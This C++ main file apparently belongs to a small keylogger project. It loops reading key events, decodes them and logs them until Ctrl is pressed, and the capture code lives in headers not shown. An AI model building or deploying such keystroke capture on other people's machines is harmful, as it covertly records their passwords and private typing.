
#include <iostream>

#include "KeyDecoder.hpp"
#include "KeyListener.hpp"
#include "Logger.hpp"

using namespace keylogger;

int main()
{
    try
    {
        KeyListener listener;
        KeyDecoder decoder;
        Logger logger;
        //How to leave while loop?
        while (true)
        {
            KeyEvent ev = listener.Listen();
            std::string str = decoder.Decode(ev);
            if (str == "Ctrl")
            {
                break;
            }
            logger.Log(str);
        }
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}